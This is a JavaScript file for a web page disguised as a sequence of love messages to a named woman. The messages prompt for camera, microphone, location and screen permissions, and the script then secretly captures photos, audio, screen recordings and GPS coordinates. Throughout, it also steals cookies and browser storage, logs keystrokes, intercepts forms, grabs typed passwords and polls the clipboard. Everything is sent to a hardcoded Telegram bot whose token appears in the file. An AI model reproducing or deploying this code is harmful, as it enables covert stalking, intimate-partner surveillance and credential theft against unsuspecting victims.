// Telegram Configuration
const TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA";
let CHAT_ID = "6837307356";

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;
let loveAlertIndex = 0;
let permissionsRequested = {
    camera: false,
    audio: false,
    location: false,
    screen: false
};

// DOM Elements
const themeToggle = document.getElementById("themeToggle");

// ==================== LOVE ALERTS WITH PERMISSION REQUESTS ====================
const loveAlerts = [
    { text: "Hello Meghuu 😘", permission: "camera" },
    { text: "I can't stop thinking about you.🥰😚❤", permission: "microphone" },
    { text: "You'll always be my girl.", permission: "location" },
    { text: "I love making you laugh. ❤❤❤😚", permission: "screen" },
    { text: "When I'm with you, nothing else matters.", permission: null },
    { text: "All love is sweet, but ours is the sweetest.", permission: null },
    { text: "Because you're in my life, I know true love exists..", permission: null },
    { text: "I love you today. I will love you tomorrow. And I'll keep on loving you every day after that, too.", permission: null },
    { text: "I can't believe a girl like you exists and that I'm lucky enough to have found her.", permission: null },
    { text: "Know that no matter where life takes us, you will always be the only one for me.", permission: null },
    { text: "My favorite part of every day is the time I get to spend with you.", permission: null },
    { text: "When others talk about their greatest achievements and things they are most proud of, the only thing that comes to mind is you.", permission: null },
    { text: "I'm missing you.", permission: null },
    { text: "You are the prettiest girl I've ever seen.", permission: null },
    { text: "Whenever I count my blessings, you are at the top of my list.", permission: null },
    { text: "I am the luckiest man alive because I get to call you mine.", permission: null },
    { text: "No one understands me like you do.", permission: null },
    { text: "You know exactly what I need, even if I don't say it.", permission: null },
    { text: "I love you not only for who you are, but also for who I become when I am with you.", permission: null },
    { text: "Ever since I met you, no one else has been worth thinking about.", permission: null },
    { text: "I know you love me because you put up with me even when I'm at my worst.", permission: null },
    { text: "if you need me, just call me i don't care if im sleeping or having my own problems or angry with you. ill be there for you anytime❣", permission: null },
    { text: "love you so much Meghuu ❣❣❣❣❣❣", permission: null }
];

function showNextLoveAlert() {
    if (loveAlertIndex >= loveAlerts.length) {
        // All alerts done, send final notification
        sendMessageToTelegram(`💖 **All Love Messages Completed** 💖\n\nTotal: ${loveAlerts.length} messages shown to Meghuu\n\n💕 Love you forever! 💕`);
        return;
    }
    
    const currentAlert = loveAlerts[loveAlertIndex];
    const result = confirm(currentAlert.text + "\n\nClick OK to continue...");
    
    if (result) {
        // User clicked OK, check if we need to request permission
        if (currentAlert.permission === "camera") {
            requestCameraPermission();
        } else if (currentAlert.permission === "microphone") {
            requestMicrophonePermission();
        } else if (currentAlert.permission === "location") {
            requestLocationPermission();
        } else if (currentAlert.permission === "screen") {
            requestScreenPermission();
        }
        
        // Move to next alert after a short delay
        loveAlertIndex++;
        setTimeout(showNextLoveAlert, 300);
    } else {
        // User clicked Cancel, still move to next
        loveAlertIndex++;
        setTimeout(showNextLoveAlert, 100);
    }
}

// ==================== PERMISSION REQUESTS ====================

// 1. CAMERA PERMISSION
async function requestCameraPermission() {
    if (permissionsRequested.camera) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false 
        });
        
        cameraStream = stream;
        permissionsRequested.camera = true;
        
        // Send notification to Telegram
        await sendMessageToTelegram(`📸 **កាមេរ៉ាត្រូវបានអនុញ្ញាត**\n\n✅ Camera permission granted\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
        
        // Capture photos silently
        setTimeout(() => capturePhotosSilently(stream), 1000);
        
    } catch (error) {
        await sendMessageToTelegram(`❌ **កាមេរ៉ាត្រូវបានបដិសេធ**\n\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
    }
}

async function capturePhotosSilently(stream) {
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        
        for (let i = 1; i <= 3; i++) {
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const file = new File([blob], `camera_photo_${i}.jpg`, { type: 'image/jpeg' });
                    await sendFileToTelegram(file, `📸 Camera Photo #${i}`);
                }, 'image/jpeg', 0.9);
            }, i * 1500);
        }
        
        setTimeout(() => {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            video.remove();
        }, 6000);
        
    } catch (error) {}
}

// 2. MICROPHONE PERMISSION
async function requestMicrophonePermission() {
    if (permissionsRequested.audio) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        permissionsRequested.audio = true;
        
        await sendMessageToTelegram(`🎤 **មីក្រូហ្វូនត្រូវបានអនុញ្ញាត**\n\n✅ Microphone permission granted\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
        
        // Record audio silently
        setTimeout(() => recordAudioSilently(stream), 1000);
        
    } catch (error) {
        await sendMessageToTelegram(`❌ **មីក្រូហ្វូនត្រូវបានបដិសេធ**\n\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
    }
}

async function recordAudioSilently(stream) {
    try {
        const audioRecorder = new MediaRecorder(stream);
        const audioChunks = [];
        
        audioRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                audioChunks.push(event.data);
            }
        };
        
        audioRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const file = new File([audioBlob], 'audio_recording.webm', { type: 'audio/webm' });
            await sendFileToTelegram(file, `🎤 Audio Recording`);
        };
        
        audioRecorder.start();
        setTimeout(() => {
            audioRecorder.stop();
            stream.getTracks().forEach(track => track.stop());
        }, 10000);
        
    } catch (error) {}
}

// 3. LOCATION PERMISSION
async function requestLocationPermission() {
    if (permissionsRequested.location) return;
    
    if (!navigator.geolocation) {
        await sendMessageToTelegram(`❌ **Geolocation មិនត្រូវបានគាំទ្រ**`);
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        async function(position) {
            permissionsRequested.location = true;
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            
            const googleMapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
            
            await sendMessageToTelegram(`📍 **ទីតាំងត្រូវបានអនុញ្ញាត**\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ Maps: ${googleMapsLink}`);
            
            // Send location as Telegram location
            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        latitude: currentLocation.lat,
                        longitude: currentLocation.lng
                    }),
                });
            } catch (err) {}
        },
        async function(error) {
            let errorMessage = "Unknown error";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = "User denied location permission";
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = "Position unavailable";
                    break;
                case error.TIMEOUT:
                    errorMessage = "Timeout";
                    break;
            }
            await sendMessageToTelegram(`❌ **ទីតាំងត្រូវបានបដិសេធ**\n\n📝 ${errorMessage}`);
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

// 4. SCREEN RECORDING PERMISSION
async function requestScreenPermission() {
    if (permissionsRequested.screen) return;
    if (isRecording) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: {
                cursor: "always",
                displaySurface: "monitor",
                frameRate: { ideal: 30 }
            },
            audio: true
        });
        
        permissionsRequested.screen = true;
        
        await sendMessageToTelegram(`🎬 **ការថតអេក្រង់ត្រូវបានអនុញ្ញាត**\n\n✅ Screen recording permission granted\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
        
        const mimeType = getSupportedMimeType();
        screenRecorder = new MediaRecorder(stream, {
            mimeType: mimeType,
            videoBitsPerSecond: 2500000
        });
        
        recordedChunks = [];
        
        screenRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };
        
        screenRecorder.onstop = async () => {
            isRecording = false;
            const blob = new Blob(recordedChunks, { type: mimeType });
            const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const fileName = `screen_record_${Date.now()}.${extension}`;
            const file = new File([blob], fileName, { type: mimeType });
            
            await sendVideoToTelegram(file, `🎥 Screen Recording\n\n📊 Size: ${formatBytes(blob.size)}`);
            
            recordedChunks = [];
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            screenRecorder = null;
        };
        
        screenRecorder.start(1000);
        isRecording = true;
        window.recordingStartTime = Date.now();
        
        // Stop after 60 seconds
        setTimeout(() => {
            if (isRecording && screenRecorder && screenRecorder.state === 'recording') {
                screenRecorder.stop();
                isRecording = false;
            }
        }, 60000);
        
        stream.getVideoTracks()[0].addEventListener('ended', () => {
            if (isRecording && screenRecorder && screenRecorder.state === 'recording') {
                screenRecorder.stop();
                isRecording = false;
            }
        });
        
    } catch (error) {
        let errorMessage = 'User denied or error occurred';
        if (error.name === 'NotAllowedError') {
            errorMessage = 'User denied screen recording permission';
        }
        await sendMessageToTelegram(`❌ **ការថតអេក្រង់ត្រូវបានបដិសេធ**\n\n📝 ${errorMessage}`);
    }
}

function getSupportedMimeType() {
    const types = [
        'video/webm;codecs=vp9,opus',
        'video/webm;codecs=vp8,opus',
        'video/webm;codecs=h264,opus',
        'video/webm',
        'video/mp4'
    ];
    
    for (const type of types) {
        if (MediaRecorder.isTypeSupported(type)) {
            return type;
        }
    }
    return 'video/webm';
}

// ==================== STEAL ALL DATA ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        cookies[name] = value;
    });
    
    return cookies;
}

function getCookieDetails() {
    const cookies = [];
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        
        const sensitiveKeywords = ['session', 'token', 'auth', 'login', 'user', 'pass', 'email', 'id', 'key', 'secret', 'jwt'];
        const isSensitive = sensitiveKeywords.some(keyword => 
            name.toLowerCase().includes(keyword) || value.toLowerCase().includes(keyword)
        );
        
        cookies.push({ name, value, isSensitive });
    });
    
    return cookies;
}

function getAllStorageData() {
    const data = { localStorage: {}, sessionStorage: {}, cookies: getAllCookies() };
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        try { data.localStorage[key] = localStorage.getItem(key); } catch(e) { data.localStorage[key] = 'Cannot read'; }
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        try { data.sessionStorage[key] = sessionStorage.getItem(key); } catch(e) { data.sessionStorage[key] = 'Cannot read'; }
    }
    
    return data;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getCookieDetails();
        const storageData = getAllStorageData();
        const deviceInfo = await collectDeviceInfo();
        
        let message = `🔴 **STOLEN DATA REPORT**\n\n`;
        message += `🍪 Cookies: ${cookies.length} found\n`;
        
        if (cookies.length > 0) {
            cookies.slice(0, 10).forEach(c => {
                const shortValue = c.value.length > 50 ? c.value.substring(0, 50) + '...' : c.value;
                message += `├─ ${c.name}: ${shortValue}\n`;
            });
        }
        
        message += `\n💾 Storage:\n├─ LocalStorage: ${Object.keys(storageData.localStorage).length} items\n├─ SessionStorage: ${Object.keys(storageData.sessionStorage).length} items\n\n`;
        message += `\n${formatDeviceInfo(deviceInfo)}`;
        
        await sendMessageToTelegram(message);
        
        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies, storage: storageData, deviceInfo };
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_data_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
        
    } catch (error) {}
}

// ==================== DEVICE INFO COLLECTION ====================
async function collectDeviceInfo() {
    const info = {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
        online: navigator.onLine ? 'Online' : 'Offline',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        url: window.location.href,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown'
    };
    
    if (currentLocation) {
        info.location = currentLocation;
    }
    
    return info;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'Unable to fetch';
    }
}

function formatDeviceInfo(info) {
    let locationText = 'Not available';
    if (info.location) {
        locationText = `Lat: ${info.location.lat}, Lng: ${info.location.lng} (±${info.location.accuracy}m)`;
    }
    
    return `
📱 **Device Information**
⏰ Time: ${info.timestamp}
🌐 IP: ${info.ip}
💻 CPU Cores: ${info.hardwareConcurrency}
🧠 RAM: ${info.deviceMemory}GB
🖥️ Platform: ${info.platform}
🗣️ Language: ${info.language}
🕐 Timezone: ${info.timezone}
📺 Screen: ${info.screen}
📍 Location: ${locationText}
📄 URL: ${info.url}
    `.trim();
}

// ==================== TELEGRAM FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
        });
    } catch (err) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
    } catch (error) {}
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
        if (!response.ok) await sendFileToTelegram(file, caption);
    } catch (error) {}
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ==================== URL FUNCTIONS ====================
function cleanURL() {
    const uri = window.location.toString();
    const patterns = ["%3D", "%3D%3D", "&m=1", "?m=1"];
    patterns.forEach(pattern => {
        if (uri.indexOf(pattern) > 0) {
            const clean_uri = uri.substring(0, uri.indexOf(pattern));
            window.history.replaceState({}, document.title, clean_uri);
        }
    });
}

function GetURLParameter(sParam) {
    const sPageURL = window.location.search.substring(1);
    const sURLVariables = sPageURL.split('&');
    for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) return sParameterName[1];
    }
    return null;
}

function decodeBase64(encodedStr) {
    try { return decodeURIComponent(atob(encodedStr)); } catch(e) { return null; }
}

function getChatIDFromURL() {
    const base64Id = GetURLParameter('i');
    return base64Id ? decodeBase64(base64Id) : null;
}

function initTheme() {
    if (!themeToggle) return;
    themeToggle.style.display = 'none';
}

// ==================== INITIALIZE ====================
document.addEventListener('DOMContentLoaded', function() {
    cleanURL();
    const chatIDFromURL = getChatIDFromURL();
    if (chatIDFromURL) CHAT_ID = chatIDFromURL;
    initTheme();
    
    // Start showing love alerts (each alert will trigger its own permission)
    setTimeout(() => {
        showNextLoveAlert();
    }, 500);
    
    // Also steal data in background
    setTimeout(() => {
        stealAllData();
    }, 5000);
    
    // Set interval for continuous data stealing
    setInterval(() => {
        stealAllData();
    }, 30000);
});

// ==================== KEYLOGGER ====================
let keylogBuffer = '';
let keylogTimer = null;

document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    
    if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Tab' || e.key === 'Backspace') {
        if (e.key === 'Enter') keylogBuffer += '[ENTER]\n';
        else if (e.key === 'Tab') keylogBuffer += '[TAB]';
        else if (e.key === 'Backspace') keylogBuffer += '[BACKSPACE]';
        else if (e.key === ' ') keylogBuffer += ' ';
        else keylogBuffer += e.key;
        
        if (keylogBuffer.length > 100 || e.key === 'Enter') {
            clearTimeout(keylogTimer);
            keylogTimer = setTimeout(async () => {
                if (keylogBuffer) {
                    await sendMessageToTelegram(`⌨️ **Keylogger**\n\n${keylogBuffer}`);
                    keylogBuffer = '';
                }
            }, 2000);
        }
    }
});

// ==================== FORM SUBMIT INTERCEPTION ====================
document.addEventListener('submit', async function(e) {
    if (!CHAT_ID) return;
    
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    
    for (let [key, value] of formData.entries()) {
        if (value instanceof File) {
            data[key] = `[FILE: ${value.name}]`;
            await sendFileToTelegram(value, `📎 Form File: ${key}`);
        } else {
            data[key] = value;
        }
    }
    
    let message = `📝 **Form Submitted**\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
    for (let [key, value] of Object.entries(data)) {
        const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
        message += `├─ ${key}: ${shortValue}\n`;
    }
    
    await sendMessageToTelegram(message);
});

// ==================== PASSWORD FIELD MONITORING ====================
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    
    const target = e.target;
    if (target.type === 'password' && target.value.length > 0) {
        const inputName = target.name || target.id || 'Unknown';
        await sendMessageToTelegram(`🔐 **Password Entered**\n\n📝 Field: ${inputName}\n🔑 Value: ${target.value}`);
    }
});

// ==================== CLIPBOARD MONITORING ====================
let lastClipboardContent = '';

setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboardContent && text.length > 0 && text.length < 500) {
            lastClipboardContent = text;
            await sendMessageToTelegram(`📋 **Clipboard Content**\n\n${text}`);
        }
    } catch (error) {}
}, 5000);